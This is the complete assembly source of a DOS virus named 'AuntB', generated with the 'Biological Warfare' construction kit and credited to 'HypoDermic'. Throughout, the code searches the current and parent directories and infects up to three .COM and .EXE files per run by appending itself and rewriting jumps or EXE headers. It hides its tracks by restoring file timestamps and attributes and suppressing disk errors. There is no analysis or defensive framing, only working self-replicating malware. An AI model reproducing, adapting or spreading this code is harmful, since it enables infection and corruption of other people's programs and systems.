; auntb : AuntB (c) by HypoDermic!! Part of the Mayberry Family!!!
; Created with Biological Warfare - Version 0.90á by MnemoniX

PING            equ     0CD7Bh
INFECT          equ     3
MARKER          equ     06864h

code            segment
                org     100h
                assume  cs:code,ds:code

start:
                db      0E9h,3,0          ; to virus
host:
                db      0CDh,20h,0        ; host program
virus_begin:
                call    $ + 3             ; BP is instruction ptr.
                pop     bp
                sub     bp,offset $ - 1

                push    ds es

                push    cs
                pop     ds
                lea     dx,[bp + offset new_DTA]
                mov     ah,1Ah
                int     21h

                mov     byte ptr [bp + infections],0

                push    [bp + exe_cs]
                push    [bp + exe_ip]
                push    [bp + exe_ss]
                push    [bp + exe_sp]
                call    traverse

                pop     [bp + exe_sp]
                pop     [bp + exe_ss]
                pop     [bp + exe_ip]
                pop     [bp + exe_cs]
                pop     es ds
                mov     dx,80h
                mov     ah,1Ah
                int     21h

                cmp     sp,MARKER               ; check for .EXE
                je      exe_exit

com_exit:
                lea     si,[bp + host]          ; restore host program
                mov     di,100h
                push    di
                movsw
                movsb

                call    fix_regs                ; fix up registers
                ret                             ; and leave
exe_exit:
                mov     ax,ds                   ; fix up return address
                add     ax,10h
                push    ax
                add     ax,cs:[bp + exe_cs]
                mov     cs:[bp + return_cs],ax

                mov     ax,cs:[bp + exe_ip]
                mov     cs:[bp + return_ip],ax

                pop     ax
                add     ax,cs:[bp + exe_ss]        ; restore stack
                cli
                mov     ss,ax
                mov     sp,cs:[bp + exe_sp]

                call    fix_regs                ; fix up registers
                sti

                db      0EAh                    ; back to host program
return_ip       dw      0
return_cs       dw      0

exe_cs          dw      -16                     ; orig CS:IP
exe_ip          dw      103h
exe_sp          dw      -2                      ; orig SS:SP
exe_ss          dw      -16

fix_regs:
                xor     ax,ax
                cwd
                xor     bx,bx
                mov     si,100h
                xor     di,di
                xor     bp,bp
                ret


traverse:
                sub     sp,64                   ; allocate stack space
                mov     si,sp
                inc     si
                mov     ah,47h                  ; get current directory
                xor     dl,dl
                push    ds
                push    ss
                pop     ds
                int     21h

                pop     ds
                dec     si
                mov     byte ptr ss:[si],'\' ; fix directory

next_dir:
                call    infect_dir

                cmp     byte ptr [bp + infections],INFECT
                je      traverse_done

                lea     dx,[bp + outer]         ; repeat in next dir up
                mov     ah,3Bh
                int     21h
                jnc     next_dir

traverse_done:
                add     sp,64                   ; reset
                mov     dx,si
                push    ds
                push    ss
                pop     ds
                mov     ah,3Bh
                int     21h
                pop     ds
                ret

infect_dir:
                mov     ah,4Eh
                lea     dx,[bp + find_me]
                int     21h
                jc      infect_done

next_file:
                lea     dx,[bp + new_DTA + 1Eh]
                call    file_open
                cmp     byte ptr [bp + infections],INFECT
                je      infect_done
                mov     ah,4Fh
                int     21h
                jnc     next_file

infect_done:
                ret

file_open:
                push    ax cx di es
                call    get_extension
                cmp     [di],'OC'               ; .COM file?
                jne     perhaps_exe             ; perhaps .EXE then
                cmp     byte ptr [di + 2],'M'
                jne     not_prog
                jmp     a_program
perhaps_exe:
                cmp     [di],'XE'               ; .EXE file?
                jne     not_prog
                cmp     byte ptr [di + 2],'E'
                jne     not_prog
a_program:
                pop     es di cx ax
                jmp     execute                 ; infect file
not_prog:
                pop     es di cx ax
                ret

execute:
                push    si

                xor     ax,ax                   ; critical error handler
                mov     es,ax                   ; routine - catch int 24
                lea     ax,[bp + int_24]
                mov     es:[24h * 4],ax
                mov     es:[24h * 4 + 2],cs

                mov     ax,4300h                ; change attributes
                int     21h

                push    cx dx ds
                xor     cx,cx
                call    set_attributes

                mov     ax,3D02h                ; open file
                int     21h
                jc      cant_open
                xchg    bx,ax

                mov     ax,5700h                ; save file date/time
                int     21h
                push    cx dx
                mov     ah,3Fh
                mov     cx,28
                lea     dx,[bp + read_buffer]
                int     21h

                cmp     word ptr [bp + read_buffer],'ZM'
                je      infect_exe              ; yes, infect as .EXE

                mov     al,2                    ; move to end of file
                call    move_file_ptr

                cmp     dx,65279 - (VIRUS_SIZE + 3)
                ja      dont_infect             ; too big, don't infect

                sub     dx,VIRUS_SIZE + 3       ; check for previous infection
                cmp     dx,word ptr [bp + read_buffer + 1]
                je      dont_infect

                add     dx,VIRUS_SIZE + 3
                mov     word ptr [bp + new_jump + 1],dx

                lea     dx,[bp + read_buffer]   ; save original program head
                int     21h
                mov     ah,40h                  ; write virus to file
                mov     cx,VIRUS_SIZE
                lea     dx,[bp + virus_begin]
                int     21h

                xor     al,al                   ; back to beginning of file
                call    move_file_ptr

                lea     dx,[bp + new_jump]
                int     21h

fix_date_time:
                pop     dx cx
                mov     ax,5701h                ; restore file date/time
                int     21h

                inc     byte ptr [bp + infections]

close:
                pop     ds dx cx                ; restore attributes
                call    set_attributes

                mov     ah,3Eh                  ; close file
                int     21h

cant_open:
                pop     si
                ret


set_attributes:
                mov     ax,4301h
                int     21h
                ret

dont_infect:
                pop     cx dx                   ; can't infect, skip
                jmp     close

move_file_ptr:
                mov     ah,42h                  ; move file pointer
                cwd
                xor     cx,cx
                int     21h

                mov     dx,ax                   ; set up registers
                mov     ah,40h
                mov     cx,3
                ret
infect_exe:
                cmp     word ptr [bp + read_buffer + 26],0
                jne     dont_infect             ; overlay, don't infect

                cmp     word ptr [bp + read_buffer + 16],MARKER
                je      dont_infect             ; infected already

                les    ax,dword ptr [bp + read_buffer + 20]
                mov    [bp + exe_cs],es
                mov    [bp + exe_ip],ax
                les    ax,dword ptr [bp + read_buffer + 14]
                mov    [bp + exe_ss],ax
                mov    [bp + exe_sp],es
                mov    word ptr [bp + read_buffer + 16],MARKER
                mov     ax,4202h                ; to end of file
                cwd
                xor     cx,cx
                int     21h

                push    ax dx                   ; save file size

                push    bx
                mov     cl,12                   ; calculate offsets for CS
                shl     dx,cl                   ; and IP
                mov     bx,ax
                mov     cl,4
                shr     bx,cl
                add     dx,bx
                and     ax,15
                pop     bx

                sub    dx,word ptr [bp + read_buffer + 8]
                mov    word ptr [bp + read_buffer + 22],dx
                mov    word ptr [bp + read_buffer + 20],ax
                add    dx,100h
                mov    word ptr [bp + read_buffer + 14],dx

                pop     dx ax                   ; calculate prog size

                add     ax,VIRUS_SIZE + 3
                adc     dx,0
                mov     cx,512                  ; in pages
                div     cx                      ; then save results
                inc     ax
                mov     word ptr [bp + read_buffer + 2],dx
                mov     word ptr [bp + read_buffer + 4],ax

                mov     ah,40h
                mov     cx,VIRUS_SIZE + 3
                lea     dx,[bp + virus_begin]
                int     21h


                mov     ax,4200h                ; back to beginning
                cwd
                xor     cx,cx
                int     21h

                mov     ah,40h                  ; and fix up header
                mov     cx,28
                lea     dx,[bp + read_buffer]
                int     21h
                jmp     fix_date_time           ; done

courtesy_of     db      '[BW]',0
signature       db      'AuntB (c) by HypoDermic!! Part of the Mayberry Family!!!',0

get_extension:
                push    ds                      ; find extension
                pop     es
                mov     di,dx
                mov     cx,64
                mov     al,'.'
                repnz   scasb
                ret

find_me         db      '*.*',0
outer           db      '..',0

int_24:
                mov     al,3                    ; int 24 handler
                iret
new_jump        db      0E9h,0,0

infections      db      0
virus_end:
VIRUS_SIZE      equ     virus_end - virus_begin
read_buffer     db      28 dup (?)              ; read buffer
new_DTA         db      128 dup(?)

end_heap:

MEM_SIZE        equ     end_heap - start

code            ends
                end     start
